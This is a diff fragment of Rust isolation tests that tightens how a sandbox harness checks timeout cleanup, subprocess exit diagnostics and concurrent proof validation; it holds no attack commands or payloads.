+                stop_attacker_responder(&validator, &mut responder, &marker, &mode);
                 return;
             } else {
                 std::fs::remove_file(&path).unwrap();
@@ -1725,25 +2196,33 @@ mod isolation_tests {
             return;
         }
 
-        let timeout_started = std::time::Instant::now();
-        let timeout_error = run_hostile_proof_mode_with_deadline(
+        let timeout_outcome = run_hostile_proof_mode_with_deadline(
             "deadline-probe",
             std::time::Duration::from_millis(100),
         )
-        .expect_err("hostile proof-mode deadline probe escaped its wall-clock bound");
+        .expect("hostile proof-mode deadline probe failed before reaching its timeout boundary");
+        let HostileModeOutcome::TimedOut {
+            diagnostic,
+            cleanup_elapsed,
+        } = timeout_outcome
+        else {
+            panic!("deadline-probe completed instead of exercising bounded timeout cleanup");
+        };
         assert!(
-            timeout_error.contains("timed out after"),
-            "hostile deadline returned the wrong bounded-cleanup error: {timeout_error}"
-        );
-        assert!(
-            timeout_started.elapsed() < std::time::Duration::from_secs(3),
-            "hostile proof-mode timeout and reap exceeded its bounded grace"
+            cleanup_elapsed < std::time::Duration::from_secs(3),
+            "hostile proof-mode timeout cleanup exceeded its bounded grace; {diagnostic}"
         );
 
         let proof = isolated_test_proof().unwrap();
         let output = run_hostile_proof_mode("normal-exit-descendant")
             .expect("normal-exit descendant mode must be reclaimed");
-        assert!(output.status.success());
+        assert!(
+            output.status.success(),
+            "normal-exit descendant cleanup failed: status={} stdout={} stderr={}",
+            output.status,
+            String::from_utf8_lossy(&output.stdout),
+            String::from_utf8_lossy(&output.stderr)
+        );
         let descendant_pid: nix::libc::pid_t =
             std::fs::read_to_string(proof.home.join("normal-exit-descendant.pid"))
                 .unwrap()
@@ -1778,7 +2257,8 @@ mod isolation_tests {
                 .unwrap_or_else(|error| panic!("{mode} proof rejection subprocess: {error}"));
             assert!(
                 output.status.success(),
-                "{mode} proof rejection subprocess failed: stdout={} stderr={}",
+                "{mode} proof rejection subprocess failed: status={} stdout={} stderr={}",
+                output.status,
                 String::from_utf8_lossy(&output.stdout),
                 String::from_utf8_lossy(&output.stderr)
             );
@@ -1790,22 +2270,48 @@ mod isolation_tests {
         if !supervisor_contract_present() {
             return;
         }
-        isolated_test_proof().unwrap();
-        let barrier = std::sync::Arc::new(std::sync::Barrier::new(9));
-        let workers = (0..8)
-            .map(|_| {
+        // One validation consumes a shared-offset proof if `read_proof_at`
+        // regresses to an ordinary read. The warm-up plus two validations per
+        // worker therefore exercises the regression repeatedly without doing
+        // 128 full supervisor-image hashes. Those hashes are intentionally
+        // part of production validation and are comparatively expensive on
+        // Linux CI.
+        const WORKER_COUNT: usize = 8;
+        const VALIDATIONS_PER_WORKER: usize = 2;
+
+        isolated_test_proof().expect("warm-up proof validation failed");
+        let barrier = std::sync::Arc::new(std::sync::Barrier::new(WORKER_COUNT + 1));
+        let workers = (0..WORKER_COUNT)
+            .map(|worker_index| {
                 let barrier = std::sync::Arc::clone(&barrier);
                 std::thread::spawn(move || {
                     barrier.wait();
-                    for _ in 0..16 {
-                        isolated_test_proof().unwrap();
+                    for validation_index in 0..VALIDATIONS_PER_WORKER {
+                        let started = std::time::Instant::now();
+                        eprintln!(
+                            "proof validation worker {worker_index} iteration {validation_index} started"
+                        );
+                        isolated_test_proof().unwrap_or_else(|error| {
+                            panic!(
+                                "proof validation worker {worker_index} iteration \
+                                 {validation_index} failed: {error:#}"
+                            )
+                        });
+                        eprintln!(
+                            "proof validation worker {worker_index} iteration {validation_index} \
+                             completed in {:?}",
+                            started.elapsed()
+                        );
                     }
                 })
             })
             .collect::<Vec<_>>();
         barrier.wait();
-        for worker in workers {
-            worker.join().unwrap();
+        for (worker_index, worker) in workers.into_iter().enumerate() {
+            worker
+                .join()
+                .unwrap_or_else(|panic| std::panic::resume_unwind(panic));
+            eprintln!("proof validation worker {worker_index} joined");
         }
     }
 
